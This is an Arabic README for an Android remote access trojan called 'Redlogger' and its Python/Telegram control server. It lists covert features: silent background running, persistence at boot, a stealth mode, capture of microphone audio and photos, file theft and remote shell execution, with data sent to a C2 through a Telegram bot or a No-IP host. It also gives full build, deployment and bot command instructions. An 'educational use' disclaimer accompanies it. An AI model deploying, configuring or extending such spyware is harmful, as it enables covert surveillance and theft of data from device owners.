# Redlogger - أداة إدارة عن بُعد لنظام Android للاختبار التعليمي

Redlogger هي أداة إدارة عن بُعد (RAT) لنظام Android مصممة للأغراض التعليمية، وتحديداً لاختبار الاختراق وفهم أمان الأجهزة المحمولة. تتضمن تطبيقاً للعميل (APK) وخادم تحكم، مع دعم آليات مرنة للقيادة والتحكم (C2) عبر Telegram Bot و No-IP.

## أهداف المشروع:

### ميزات العميل (APK):
- يعمل بصمت في الخلفية
- يبدأ تلقائياً عند تشغيل الجهاز
- يجمع بيانات الجهاز: IMEI، إصدار Android، حالة البطارية، والموقع (إذا سُمح بالأذونات)
- يصل إلى الميكروفون لتسجيل الصوت المحيط
- يلتقط الصور باستخدام كاميرا الجهاز
- يسرد الملفات ويرفعها وينزلها من الجهاز
- ينفذ أوامر shell على الجهاز
- يرسل البيانات المجمعة ونتائج الأوامر إلى خادم C2 عبر Telegram Bot API أو HTTP POST إلى عنوان No-IP

### ميزات التحكم (Bot/Server):
- مُنفذ كخادم Python Flask أو FastAPI
- يعمل كـ:
  - مستمع Telegram bot (باستخدام `python-telegram-bot`) للتحكم عن بُعد عبر أوامر البوت
  - خادم HTTP مبني على No-IP لاستقبال الأوامر والسجلات من العميل
- يسجل جميع الأنشطة لكل معرف جهاز فريد
- مصمم للنشر السهل على منصات مثل Termux أو Codespaces أو Railway (متوافق مع الطبقة المجانية)

## 🚀 دليل البدء السريع

### المتطلبات الأساسية

- Python 3.10 أو 3.11
- جهاز Android أو محاكي (Android 7+)
- حساب Telegram (لإعداد البوت)
- حساب No-IP (اختياري، لـ DDNS)

### 1. إعداد وحدة التحكم

#### الخيار أ: التطوير المحلي

```bash
# استنساخ المستودع
git clone https://github.com/yourusername/redlogger.git
cd redlogger

# تشغيل سكريبت النشر
chmod +x deploy.sh
./deploy.sh --local
```

#### الخيار ب: نشر Railway (موصى به)

```bash
# تثبيت Railway CLI
npm install -g @railway/cli

# تعيين متغيرات البيئة
export TELEGRAM_BOT_TOKEN="your_bot_token_here"
export TELEGRAM_CHAT_ID="your_chat_id_here"

# النشر على Railway
./deploy.sh --railway
```

### 2. إعداد Telegram Bot

1. **إنشاء Telegram Bot:**
   - أرسل رسالة إلى @BotFather على Telegram
   - أرسل `/newbot` واتبع التعليمات
   - احفظ رمز البوت (مثل: `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`)

2. **الحصول على Chat ID:**
   - ابدأ محادثة مع البوت الخاص بك
   - أرسل أي رسالة للبوت
   - زر: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
   - ابحث عن chat ID في الاستجابة

### 3. بناء Android APK

#### الخيار أ: GitHub Actions (موصى به)

1. انسخ هذا المستودع (Fork)
2. ادفع تغييراتك لتشغيل البناء
3. حمل APK من artifacts في Actions

#### الخيار ب: البناء المحلي مع Buildozer

```bash
# تثبيت التبعيات (Ubuntu/Debian)
sudo apt-get update
sudo apt-get install -y git zip unzip openjdk-17-jdk python3-pip autoconf libtool pkg-config zlib1g-dev libncurses5-dev libncursesw5-dev libssl-dev

# تثبيت Buildozer
pip install buildozer

# بناء APK
cd redlogger_client
buildozer android debug
```

### 4. تكوين عميل Android

قبل البناء أو بعد التثبيت، قم بتكوين العميل:

```python
# في redlogger_client/main.py
TELEGRAM_BOT_TOKEN = 'your_bot_token_here'
TELEGRAM_CHAT_ID = 'your_chat_id_here'
NOIP_URL = 'http://your-domain.ddns.net:5000'  # اختياري
```

## 📱 ميزات عميل Android

### الوظائف الأساسية

- **التشغيل الصامت:** يعمل في الخلفية بدون واجهة مستخدم
- **الاستمرارية عند الإقلاع:** يبدأ تلقائياً عند تشغيل الجهاز
- **وضع التخفي:** استخدام أدنى للبطارية والموارد

### جمع البيانات

- معلومات الجهاز (IMEI، الطراز، الشركة المصنعة)
- إصدار Android وتفاصيل النظام
- حالة ومستوى البطارية
- معلومات الشبكة (WiFi SSID، نوع الاتصال)
- استخدام التخزين والذاكرة
- بيانات الموقع (إذا مُنحت الأذونات)

### الأوامر عن بُعد

- **أوامر Shell:** تنفيذ أي أمر shell عن بُعد
- **عمليات الملفات:** سرد ورفع وتنزيل الملفات
- **تسجيل الصوت:** تسجيل الصوت المحيط لمدة محددة
- **التقاط الصور:** التقاط الصور باستخدام كاميرات الجهاز
- **معلومات النظام:** الحصول على معلومات مفصلة عن النظام والشبكة

## 🎛️ ميزات وحدة التحكم

### واجهة الويب

- **إدارة الأجهزة:** عرض جميع الأجهزة المتصلة
- **الأوامر الفورية:** إرسال الأوامر عبر واجهة الويب
- **سجلات الأنشطة:** مراقبة جميع أنشطة الأجهزة
- **الأوامر السريعة:** عمليات شائعة محددة مسبقاً

### أوامر Telegram Bot

```
/start          - عرض الأوامر المتاحة
/devices        - سرد جميع الأجهزة المتصلة
/logs <device>  - عرض سجلات الجهاز
/cmd <device> <command> - تنفيذ أمر shell
/audio <device> [duration] - تسجيل الصوت
/photo <device> - التقاط صورة
/files <device> [path] - سرد الملفات
/upload <device> <file> - رفع ملف من الجهاز
/download <device> <url> <path> - تنزيل ملف إلى الجهاز
```

## 🚨 الاعتبارات القانونية والأخلاقية

### للاستخدام التعليمي فقط

هذه الأداة مصممة لـ:
- الأغراض التعليمية وتعلم أمان Android
- اختبار الاختراق المصرح به مع الأذونات المناسبة
- البحث الأمني في البيئات المحكومة

### الاستخدامات المحظورة

لا تستخدم هذه الأداة لـ:
- الوصول غير المصرح به للأجهزة التي لا تملكها
- المراقبة غير القانونية أو انتهاك الخصوصية
- الأنشطة الخبيثة أو الجرائم الإلكترونية

### أفضل الممارسات

1. **احصل دائماً على إذن صريح** قبل التثبيت على أي جهاز
2. **استخدم فقط في البيئات المحكومة** (أجهزتك الخاصة، بيئات المختبر)
3. **احترم قوانين الخصوصية** واللوائح في منطقتك القضائية
4. **وثق اختباراتك** لتقييمات الأمان المشروعة
5. **أزل الأداة** بعد اكتمال الاختبار

### إخلاء المسؤولية القانونية

المستخدمون مسؤولون وحدهم عن ضمان امتثال استخدامهم لهذه الأداة لجميع القوانين واللوائح المعمول بها. المطورون لا يتحملون أي مسؤولية عن سوء الاستخدام أو الأنشطة غير القانونية.

## 🛠️ استكشاف الأخطاء وإصلاحها

### المشاكل الشائعة

1. **فشل بناء APK:**
   ```bash
   # مسح ذاكرة التخزين المؤقت لـ Buildozer
   buildozer android clean
   
   # تحديث Buildozer
   pip install --upgrade buildozer
   ```

2. **رفض الأذونات:**
   ```bash
   # منح الأذونات يدوياً
   adb shell pm grant org.redlogger.redlogger android.permission.CAMERA
   adb shell pm grant org.redlogger.redlogger android.permission.RECORD_AUDIO
   ```

3. **وحدة التحكم غير قابلة للوصول:**
   ```bash
   # فحص إعدادات الجدار الناري
   sudo ufw allow 5000
   
   # التحقق من ربط المنفذ
   netstat -tlnp | grep 5000
   ```

## 📚 موارد إضافية

### التوثيق

- [توثيق Kivy](https://kivy.org/doc/stable/)
- [توثيق Buildozer](https://buildozer.readthedocs.io/)
- [توثيق Flask](https://flask.palletsprojects.com/)
- [Telegram Bot API](https://core.telegram.org/bots/api)

### موارد الأمان

- [OWASP Mobile Security](https://owasp.org/www-project-mobile-security-testing-guide/)
- [إرشادات أمان Android](https://developer.android.com/topic/security)
- [أطر اختبار الاختراق](https://www.kali.org/)

---

**ملاحظة:** هذا المشروع للأغراض التعليمية فقط. استخدمه بمسؤولية وفقاً للقوانين المحلية.

[🔗 للنسخة الإنجليزية من التوثيق](README.md)

